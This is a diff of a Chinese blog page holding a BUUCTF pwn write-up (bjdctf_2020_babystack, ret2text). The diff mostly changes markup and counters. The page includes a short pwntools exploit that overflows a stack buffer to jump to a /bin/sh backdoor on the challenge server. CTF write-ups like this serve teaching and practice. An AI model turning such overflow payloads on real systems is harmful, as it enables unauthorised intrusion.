@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -149,7 +151,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week-6-T1-bjdctf-2020-babystack"><span class="nav-text">Week 6 T1 bjdctf_2020_babystack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">Week 6 T1 bjdctf_2020_babystack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -175,7 +177,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -367,7 +369,7 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="Week-6-T1-bjdctf-2020-babystack"><a href="#Week-6-T1-bjdctf-2020-babystack" class="headerlink" title="Week 6 T1 bjdctf_2020_babystack"></a>Week 6 T1 bjdctf_2020_babystack</h2><blockquote>
+        <h2><span id="week-6-t1-bjdctf_2020_babystack">Week 6 T1 bjdctf_2020_babystack</span></h2><blockquote>
 <p>2023-02-05WP<br>BUUCTF pwn 第十一题<br>考点：ret2text</p>
 </blockquote>
 <span id="more"></span>
@@ -379,16 +381,16 @@
 <blockquote>
 <p>read(0, &amp;buf, (unsigned int)nbytes)   用户可以控制长度，实现栈溢出</p>
 </blockquote>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开IDA</p>
+<h3><span id="0x02">0x02</span></h3><p>打开IDA</p>
 <p><img data-src="https://img-blog.csdnimg.cn/20200802192521891.png"></p>
 <p>找到有&#x2F;bin&#x2F;sh<br>找到后门函数</p>
 <p><img data-src="https://img-blog.csdnimg.cn/20200802192937904.png"></p>
 <p>buf占用的空间为0x10</p>
 <p><img data-src="https://img-blog.csdnimg.cn/20200802192913332.png"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
+<h3><span id="0x03">0x03</span></h3><p>exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line"></span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,29891)</span><br><span class="line"></span><br><span class="line">backdoor_addr = 0x4006e6</span><br><span class="line"></span><br><span class="line">payload =b &#x27;a&#x27; * (0x10+8) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;100&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>发现这样也不错，交给工具来找地址</p>
+<h3><span id="0x04">0x04</span></h3><p>发现这样也不错，交给工具来找地址</p>
 <p><img data-src="https://img-blog.csdnimg.cn/4d3c024d108c4bbd85c7ef85fd505712.png"></p>
 <ul>
 <li>变量(unsigned int)nbytes用户可控，且是个无符号函数</li>
@@ -602,13 +604,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
